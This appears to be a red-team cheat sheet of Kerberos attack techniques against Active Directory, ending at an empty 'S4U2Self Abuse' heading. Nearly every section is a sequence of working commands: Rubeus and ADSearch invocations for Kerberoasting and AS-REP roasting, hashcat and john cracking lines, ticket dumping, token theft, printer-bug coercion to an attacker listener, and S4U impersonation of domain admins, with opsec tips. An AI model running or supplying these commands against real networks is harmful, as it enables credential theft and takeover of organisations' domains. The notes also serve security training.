# Kerberos notes

**Kerberoasting**

Request the TGS for services running under the context of domain accounts to crack offline

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
```

--format=krb5tgs --wordlist=wordlist hashes for john or -a 0 -m 13100 hashes wordlist 

```
john --format=krb5tgs --wordlist=wordlist mssql_svc
hashcat -a 0 -m 13100 hash wordlist
```

opsec consideration, query users first then roast them
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:<User> /nowrap
```

**ASREP Roast**

Users with no kerberos pre-auth can be requested and their can be cracked offline

This will start with a query then a roast
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:<User> /nowrap
```

crack --format=krb5asrep --wordlist=wordlist squid_svc for john or -a 0 -m 18200 squid_svc wordlist for hashcat
```
john --format=krb5asrep --wordlist=wordlist hash
hashcat -a 0 -m 18200 hash wordlist
```

**Unconstrained Delegation**

A machine or user is allowed to act on the behalf of another with no restrictions

search for all computers with this
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```

an example exploit of it being used to steal another users session by abusing a machine other users interact with
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<user> /password:FakePass /ticket:doIFwj[...]MuSU8=
steal_token 1540
```

stealing TGT's by forcing them to auth to this machine we popped
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe <target> <attacker owned listener>
```

**Constrained Delegation**

Similar to unconstrained but the delegation attempts to restrict services the server can act on behalf of a user

To find computers configured for constrained delegation, search for those whose  msds-allowedtodelegateto attribute is not empty.
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```

To perform we need the TGT of the principal trusted for delegation, use Rubeus for this
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
```

Now use S4U to obtain a TGS for CIFS for the DC for a domain admin, then run another S4UProxy ticket and pass it into a new logon session, and of course steal it's token
Make sure to always use the FQDN afterwards, or you will get errors
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:<domain admin wanted to impersonate> /msdsspn:cifs/<DC domain name> /user:<current user with constrained delegation> /ticket:doIFLD[...snip...]MuSU8= /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<domain admin wanted to impersonate> /password:FakePass /ticket:doIGaD[...]ljLmlv
steal_token 5540
```

**Alternate Service Name**

The SPN information in the ticket is not encrypted and can be changed arbitrarily.  We can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it 
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:<domain admin wanted to impersonate> /msdsspn:cifs/<DC domain name> /altservice:ldap /user:<current user> /ticket:doIFpD[...]MuSU8= /nowrap
```

**S4U2Self Abuse**


